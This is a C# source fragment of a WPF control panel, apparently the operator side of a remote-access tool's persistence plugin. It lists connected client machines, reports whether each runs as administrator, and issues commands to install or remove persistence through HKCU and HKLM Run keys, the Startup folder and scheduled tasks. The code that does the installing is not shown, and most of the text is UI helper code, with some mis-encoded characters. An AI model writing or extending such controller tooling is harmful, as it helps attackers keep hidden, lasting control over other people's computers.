        // ==================== Client events (called from plugin) ====================

        public void OnClientAdded(string clientId)
        {
            Dispatcher.BeginInvoke(() =>
            {
                if (_clients.Any(c => c.ClientId == clientId)) return;
                _clients.Add(new PersistenceClientRow(clientId) { IsSelected = true });
                UpdateCount();
                AppendLog($"Client added: {Shorten(clientId)}");
            });
        }

        public void OnClientRemoved(string clientId)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var row = _clients.FirstOrDefault(c => c.ClientId == clientId);
                if (row != null)
                {
                    _clients.Remove(row);
                    UpdateCount();
                    AppendLog($"Client removed: {Shorten(clientId)}");
                }
            });
        }

        public void OnClientReady(string clientId)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var row = GetOrAddRow(clientId);
                row.IsReady = true;
                row.State = "Ready";
                AppendLog($"{Shorten(clientId)} ready");
            });
        }

        public void OnCommandAck(string clientId, byte opcode)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var row = GetOrAddRow(clientId);
                string op = GetOpName(opcode);
                row.LastResult = $"? {op}";
                AppendLog($"{Shorten(clientId)}: {op} OK");
            });
        }

        public void OnCommandError(string clientId, byte opcode, string error)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var row = GetOrAddRow(clientId);
                string op = GetOpName(opcode);
                row.LastResult = $"? {op}: {error}";
                AppendLog($"{Shorten(clientId)}: {op} FAILED � {error}");
            });
        }

        public void OnInfoReceived(string clientId, string info)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var row = GetOrAddRow(clientId);
                row.LastResult = "Info received";
                AppendLog($"{Shorten(clientId)}: Process info received");

                // Parse admin status from info
                var lines = info.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                foreach (var line in lines)
                {
                    if (line.StartsWith("IsAdmin="))
                    {
                        bool isAdmin = line.Contains("True");
                        row.State = isAdmin ? "Ready (Admin)" : "Ready (User)";
                    }
                }
            });
        }

        public void OnStatusReceived(string clientId, string status)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var row = GetOrAddRow(clientId);

                var lines = status.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                foreach (var line in lines)
                {
                    int eq = line.IndexOf('=');
                    if (eq < 0) continue;
                    string key = line.Substring(0, eq).Trim();
                    string val = line.Substring(eq + 1).Trim();

                    bool installed = val.StartsWith("YES");
                    string display = installed ? "?" : "?";

                    switch (key)
                    {
                        case "HKCU": row.HKCU = display; break;
                        case "HKLM": row.HKLM = display; break;
                        case "StartupFolder": row.StartupFolder = display; break;
                        case "TaskScheduler": row.TaskScheduler = display; break;
                    }
                }

                row.LastResult = "Status updated";
                AppendLog($"{Shorten(clientId)}: Status updated");
            });
        }

        // ==================== Helpers ====================

        private PersistenceClientRow GetOrAddRow(string clientId)
        {
            var row = _clients.FirstOrDefault(c => c.ClientId == clientId);
            if (row == null)
            {
                row = new PersistenceClientRow(clientId) { IsSelected = true };
                _clients.Add(row);
                UpdateCount();
            }
            return row;
        }

        private void UpdateCount()
        {
            int total = _clients.Count;
            int ready = _clients.Count(c => c.IsReady);
            _clientCountLabel.Text = $"{ready} ready / {total} clients";
        }

        private void AppendLog(string msg)
        {
            Dispatcher.BeginInvoke(() =>
            {
                string ts = DateTime.Now.ToString("HH:mm:ss");
                _logTextBox.AppendText($"[{ts}] {msg}\n");

                if (_logTextBox.Text.Length > MaxLogLength)
                {
                    int removeUpTo = _logTextBox.Text.Length - LogTrimTarget;
                    // Find next newline after the cut point to avoid partial lines
                    int nextNewline = _logTextBox.Text.IndexOf('\n', removeUpTo);
                    if (nextNewline >= 0 && nextNewline < _logTextBox.Text.Length - 1)
                        removeUpTo = nextNewline + 1;

                    _logTextBox.Select(0, removeUpTo);
                    _logTextBox.SelectedText = "";
                    _logTextBox.Select(_logTextBox.Text.Length, 0);
                }

                _logTextBox.ScrollToEnd();
            });
        }

        private static string Shorten(string id) => id.Length > 12 ? id.Substring(0, 12) + "�" : id;

        private static string GetOpName(byte op)
        {
            switch (op)
            {
                case 0x01: return "Query Info";
                case 0x02: return "Install HKCU";
                case 0x03: return "Install HKLM";
                case 0x04: return "Install Startup";
                case 0x05: return "Install Task";
                case 0x10: return "Remove HKCU";
                case 0x11: return "Remove HKLM";
                case 0x12: return "Remove Startup";
                case 0x13: return "Remove Task";
                case 0x20: return "Query Status";
                case 0x30: return "Set Name";
                default: return $"0x{op:X2}";
            }
        }

        private static GridViewColumn CreateColumn(string header, string binding, double width, bool isCheckBox = false)
        {
            var col = new GridViewColumn
            {
                Header = header,
                Width = width
            };

            if (isCheckBox)
            {
                var factory = new FrameworkElementFactory(typeof(CheckBox));
                factory.SetBinding(System.Windows.Controls.Primitives.ToggleButton.IsCheckedProperty,
                    new System.Windows.Data.Binding(binding) { Mode = System.Windows.Data.BindingMode.TwoWay });
                col.CellTemplate = new DataTemplate { VisualTree = factory };
            }
            else
            {
                col.DisplayMemberBinding = new System.Windows.Data.Binding(binding);
            }

            return col;
        }

        private Border MakeSectionSeparator()
        {
            return new Border
            {
                Height = 1,
                Background = new SolidColorBrush(C("BorderColor")),
                Margin = new Thickness(0, 6, 0, 6)
            };
        }

        private TextBlock MakeHeader(string text)
        {
            return new TextBlock
            {
                Text = text,
                FontSize = 13,
                FontWeight = FontWeights.SemiBold,
                Foreground = new SolidColorBrush(C("TextSecondaryColor")),
                Margin = new Thickness(0, 4, 0, 4)
            };
        }

        private Button MakeThemedButton(string text, Color normalBg, Color hoverBg, SolidColorBrush fg = null)
        {
            var normalBrush = new SolidColorBrush(normalBg);
            var hoverBrush = new SolidColorBrush(hoverBg);
            var borderBrush = new SolidColorBrush(C("ButtonBorderColor"));
            var disabledBg = new SolidColorBrush(C("ButtonBgColor"));

            var template = new ControlTemplate(typeof(Button));
            var border = new FrameworkElementFactory(typeof(Border), "bd");
            border.SetValue(Border.BackgroundProperty, normalBrush);
            border.SetValue(Border.BorderBrushProperty, borderBrush);
            border.SetValue(Border.BorderThicknessProperty, new Thickness(1));
            border.SetValue(Border.CornerRadiusProperty, new CornerRadius(3));
            border.SetValue(Border.PaddingProperty, new Thickness(8, 4, 8, 4));
            border.SetValue(Border.SnapsToDevicePixelsProperty, true);

            var cp = new FrameworkElementFactory(typeof(ContentPresenter), "cp");
            cp.SetValue(ContentPresenter.HorizontalAlignmentProperty, HorizontalAlignment.Center);
            cp.SetValue(ContentPresenter.VerticalAlignmentProperty, VerticalAlignment.Center);
            border.AppendChild(cp);
            template.VisualTree = border;

            var hover = new Trigger { Property = UIElement.IsMouseOverProperty, Value = true };
            hover.Setters.Add(new Setter(Border.BackgroundProperty, hoverBrush, "bd"));
            template.Triggers.Add(hover);

            var pressed = new Trigger { Property = ButtonBase.IsPressedProperty, Value = true };
            pressed.Setters.Add(new Setter(Border.BackgroundProperty, hoverBrush, "bd"));
            pressed.Setters.Add(new Setter(UIElement.OpacityProperty, 0.85, "bd"));
            template.Triggers.Add(pressed);

            var disabled = new Trigger { Property = UIElement.IsEnabledProperty, Value = false };
            disabled.Setters.Add(new Setter(Border.BackgroundProperty, disabledBg, "bd"));
            disabled.Setters.Add(new Setter(ContentPresenter.OpacityProperty, 0.4, "cp"));
            template.Triggers.Add(disabled);

            return new Button
            {
                Content = text,
                Template = template,
                Foreground = fg ?? new SolidColorBrush(C("TextPrimaryColor")),
                Cursor = Cursors.Hand,
                Margin = new Thickness(2),
                FontSize = 12,
                FontWeight = FontWeights.SemiBold
            };
        }

        public void Dispose() { }
    }
}